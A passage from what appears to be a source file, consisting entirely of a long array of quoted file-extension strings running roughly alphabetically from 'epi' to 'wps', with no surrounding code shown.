				"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
				"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
				"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
				"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
				"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
				"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
				"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
				"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
				"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
				"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
				"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
				"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
				"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
				"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
				"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
				"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
				"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
				"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
				"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
				"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
				"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
				"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
				"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
				"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
				"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
				"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
				"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
				"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
				"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
				"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
				"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
				"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
				"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
				"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
				"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
				"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
				"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
				"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
				"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
				"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
				"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
				"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
				"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
				"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
				"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
				"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
				"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
				"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
				"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
				"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
				"hmt", "hmxp", "hmxz", "hnd", "hoi4", "hol", "hot", "hp2", "hpd", "hpj",
				"hplg", "hpo", "hpp", "hps", "hpt", "hpw", "hqx", "hrx", "hs", "hs2",
				"hsdt", "hsk", "hsm", "hst", "hsx", "hta", "htb", "htg", "htm", "htm~",
				"html", "htmls", "htmlz", "htms", "htpasswd", "htz5", "huh", "hvc", "HVE", "hvpl",
				"hw3", "hwp", "hwpml", "hwt", "hxe", "hxi", "HXL", "HXN", "hxq", "hxr",
				"hxs", "HXX", "hyp", "hype", "hyv", "i00", "i01", "i02", "i5z", "iab",
				"iaf", "ial", "ias", "ib", "iba", "ibadr", "ibank", "ibb", "ibcd", "ibd",
				"ibdat", "ibg", "ibk", "ibp", "ibq", "ibz", "icalevent", "icaltodo", "icbu", "icc",
				"icf", "icg", "ichat", "icml", "icmt", "ico", "icr", "ics", "icst", "icxs",
				"id2", "id3tag", "idap", "idb", "idc", "idd", "idl", "idml", "idp", "idx",
				"ie5", "ie6", "ie7", "ie8", "ie9", "ies", "ifaith", "iff", "ifiction", "ifm",
				"ifp", "ifs", "igc", "igg", "igma", "ign", "igq", "igr", "ihf", "ihp",
				"ihx", "ii", "iif", "iiq", "iks", "ila", "ildoc", "ilg", "ilogicvb", "ima",
				"image", "imd", "img", "imp", "imr", "imt", "imz", "in", "INBOX", "INC",
				"incp", "incpas", "ind", "indb", "indd", "INDEX", "indl", "indp", "indt", "inf",
				"info", "ink", "inld", "inlk", "inp", "inprogress", "inrs", "ins", "inss", "installhelper",
				"insx", "internetconnect", "inx", "ioca", "iof", "ip", "ipa", "ipalias", "ipd", "ipf",
				"iphoto", "iplb", "ipmeta", "ipr", "iproject", "iq4", "iqmol", "irock", "irp", "irr",
				"irx", "is1", "is2", "isf", "ish1", "ish2", "ish3", "iso", "ispc", "ispx",
				"ist", "isu", "isz", "itdb", "ite", "itl", "itlp", "itm", "itmsp", "itmz",
				"itn", "itp", "its", "itw", "itx", "iup", "iv2i", "ivc", "ivd", "ivs",
				"ivt", "iw", "iw44", "iwa", "iwd", "iwi", "iwm", "iwprj", "iwtpl", "iwxdata",
				"ix", "ix2", "ixa", "ixb", "ixv", "j01", "jac", "jar", "jasper", "jav",
				"java", "jb2", "jbc", "jbi", "jbig", "jbig2", "jbk", "jbr", "jc", "jclic",
				"JCP", "jdat", "jdb", "jdc", "jdd", "jef", "jet", "jfif", "JFM", "jgcscs",
				"jge", "jgz", "jhd", "jiaf", "jias", "jif", "jiff", "jmp", "jnb", "jnt",
				"joboptions", "joe", "joined", "jp1", "jpa", "jpc", "jpe", "jpeg", "jpf", "jpg",
				"jpgx", "jph", "jpm", "jps", "jpw", "jrf", "jrl", "jrprint", "JRS", "jrxml",
				"js", "JS1", "jsd", "jsda", "json", "jsp", "jspa", "jspx", "jtbackup", "jtd",
				"jtdc", "jtt", "JTX", "jude", "just", "jw", "jwl", "jww", "k25", "k3b",
				"kal", "kap", "kb2", "kbd", "kbf", "kbits", "kbs", "kc2", "kdb", "kdbx",
				"kdc", "kde", "kdf", "kdz", "keb", "kelgfile", "kes", "kexi", "kexic", "kexis",
				"key", "keychain", "keynote", "keytab", "key-tef", "kf", "kfm", "kfp", "kgtemp", "kid",
				"kismac", "klq", "klw", "kma", "kms", "kmy", "kmz", "kno", "knt", "kos",
				"kpdx", "kpf", "kpp", "kpr", "kpx", "kpz", "krc", "ksd", "ksm", "ksp",
				"kss", "ksw", "kth", "kuip", "kvtml", "kwd", "kwm", "kwp", "l", "l01",
				"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
				"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
				"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
				"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
				"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
				"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
				"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
				"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
				"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
				"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
				"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
				"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
				"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
				"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
				"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
				"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
				"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
				"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
				"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
				"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
				"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
				"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
				"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
				"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
				"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
				"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
				"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
				"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
				"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
				"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
				"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
				"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
				"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
				"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
				"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
				"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
				"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
				"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
				"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
				"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
				"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
				"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
				"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
				"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
				"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
				"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
				"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
				"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
				"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
				"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
				"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
				"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
				"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
				"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
				"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
				"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
				"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
				"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
				"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
				"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
				"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
				"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
				"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
				"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
				"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
				"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
				"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
				"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
				"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
				"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
				"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
				"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
				"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
				"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
				"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
				"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
				"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
				"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
				"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
				"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
				"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
				"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
				"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
				"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
				"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
				"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
				"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
				"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
				"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
				"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
				"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
				"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
				"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
				"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
				"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
				"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
				"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
				"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
				"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
				"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
				"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
				"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
				"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
				"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
				"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
				"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
				"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
				"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
				"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
				"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
				"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
				"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
				"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
				"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
				"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
				"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
				"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
				"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
				"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
				"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
				"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
				"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
				"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
				"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
				"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
				"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
				"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
				"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
				"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
				"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
				"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
				"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
				"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
				"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
				"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
				"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
				"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
				"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
				"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
				"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
				"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
				"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
				"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
				"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
				"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
				"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
				"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
				"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
				"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
				"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
				"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
				"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
				"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
				"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
				"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
				"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
				"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
				"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
				"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
				"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
				"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
				"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
				"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
				"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
				"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
				"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
				"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
				"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
				"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
				"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
				"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
				"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
				"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
				"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
				"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
				"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
				"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
				"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
				"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
				"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
				"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
				"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
				"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
				"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
				"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
				"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
				"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
				"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
				"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
				"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
				"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
				"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
				"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
				"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
				"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
				"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
				"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
				"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
				"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
				"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
				"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
				"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
				"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
				"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
				"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
				"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
				"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
				"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
				"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
				"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
				"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
				"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
				"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
				"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
